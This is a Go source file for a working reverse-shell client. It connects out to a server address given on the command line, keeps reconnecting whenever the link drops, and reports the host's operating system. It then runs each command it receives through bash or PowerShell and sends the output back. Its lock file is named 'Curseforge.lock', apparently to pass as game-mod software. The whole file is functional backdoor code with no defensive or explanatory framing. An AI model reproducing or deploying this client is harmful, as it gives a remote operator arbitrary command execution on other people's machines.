package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/gofrs/flock"
)

// globals
var terminator = "__END__\n"
var retryTimer = (5 * time.Second)

var conn net.Conn
var serverIP string
var detectedOs string
var myIP string
var currentDir string

var debug = true

/*
*
function that handles errors so I don't have to write ts EVERY SINGLE TIME
param err - the error to print out
*/
func handleErr(err error) {
	if err != nil {
		if debug {
			fmt.Println("Error! : ", err)
		}
		initListener(serverIP) // if we for ANY REASON lose connectivity, go back to trying to connect
	}
}

/*
*
Detects the OS of the client system.
*/
func detectOs() {
	switch runtime.GOOS {
	case "windows":
		if debug {
			fmt.Println("Windows detected!")
		}
		detectedOs = "windows"
		currentDir = "C:\\"
	case "linux":
		if debug {
			fmt.Println("Linux Detected!")
		}
		detectedOs = "linux"
		currentDir = "~"
	default:
		if debug {
			fmt.Println("Unsupported os! some things might not work as expected...")
		}
	}
}

func initListener(serveraddr string) {
	var err error
	conn, err = net.Dial("tcp", serveraddr)
	for err != nil {
		if debug {
			fmt.Println("RETRYING CONNECTION!")
		}
		time.Sleep(retryTimer) // retry after a few seconds
		conn, err = net.Dial("tcp", serveraddr)
	}
	myIP = conn.LocalAddr().String()
	handleErr(err)

	if debug {
		fmt.Println("Listener now from: ", conn.LocalAddr().String())
	}
	runLogged("GET_OS")
	listen()
}

func listen() {
	userdir, err := os.UserHomeDir()
	handleErr(err)
	if debug {
		fmt.Println(userdir)
	} //to appease the golang gods
	// conn.Write([]byte(userdir))
	scan()
}

func scan() {
	var cmd string
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		cmd = scanner.Text()
		if strings.Contains(cmd, "CMD:") {
			cmd = cmd[5:]
			cmd = strings.Trim(cmd, " \"")
			if debug { fmt.Println("Running command: " + cmd) }
			runLogged(cmd)
		}
	}

	if err := scanner.Err(); err != nil { handleErr(err) }
}

func runLogged(cmd string) {
	var out *exec.Cmd
	var output []byte
	var tempout []byte
	output = []byte(("Message from " + myIP + "\n"))
	conn.Write(output) //try to flush any residual output from super long outputs

	if strings.Contains(cmd, "GET_OS") {
		output = []byte(detectedOs + "\n")
		conn.Write(output)
		
		conn.Write([]byte(terminator))
		return
	}

	if strings.Contains(cmd, "__CLOSING__") {
		fmt.Println("HERE!")
		conn.Close()
		initListener(serverIP)

	}

	if strings.Contains(cmd, "cd") {
		if strings.Compare(cmd, "cd ..") != 0 {
			currentDir = cmd[3:]
		} else {
			temp := strings.LastIndex(currentDir, "\\")
			if temp != -1 {
				currentDir = currentDir[:temp]
			}
		}

		if debug {
			fmt.Println("currentdir: " + currentDir)
		}
		tempout := "directory changed to: " + currentDir
		conn.Write([]byte(tempout))
	}

	if runtime.GOOS == "windows" {
		if debug {
			fmt.Println(currentDir)
		}
		out = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", "cd "+currentDir+"; "+cmd)
	} else {
		out = exec.Command("bash", "-c", "cd "+currentDir+"; "+cmd)
	}

	tempout, _ = out.CombinedOutput()
	output = append(output, tempout...)
	output = append(output, []byte(terminator)...)

	conn.Write(output)
	if debug {
		fmt.Println("cmd completed")
	}
}

func main() {

	//check if we have another thing open / lock file is already there
	lockfile := flock.New("Curseforge.lock")

	locked, err := lockfile.TryLock()
	if err != nil || !locked {
		fmt.Println(err.Error())
		fmt.Println(locked)
		os.Exit(1)
	}

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)

	defer func() {
		lockfile.Unlock()
		os.Remove("Curseforge.lock")
	}()

	if len(os.Args) == 1 {
		serverIP = "127.0.0.1:55565"
	} else {
		serverIP = os.Args[1]
	}

	if debug {
		fmt.Println("Initializing Client...")
	}
	detectOs()

	go initListener(serverIP)

	<-sigs
	lockfile.Unlock()
	os.Remove("Curseforge.lock")

}
